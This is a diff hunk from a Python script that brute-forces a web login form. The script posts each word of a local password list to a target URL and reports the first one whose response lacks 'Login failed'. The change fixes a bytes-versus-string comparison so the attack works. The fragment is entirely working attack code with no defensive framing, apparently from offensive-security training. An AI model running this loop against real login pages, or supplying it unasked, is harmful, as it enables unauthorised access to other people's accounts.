@@ -10,7 +10,7 @@ with open("/root/Downloads/passwords.txt", "r") as word_list:
         word = line.strip()
         data_dict["password"] = word
         response = requests.post(target_url, data=data_dict)
-        if "Login failed" not in response.content:
+        if "Login failed" not in response.content.decode(errors="ignore"):
             print("[+] Got the password --> " + word)
             exit()
 
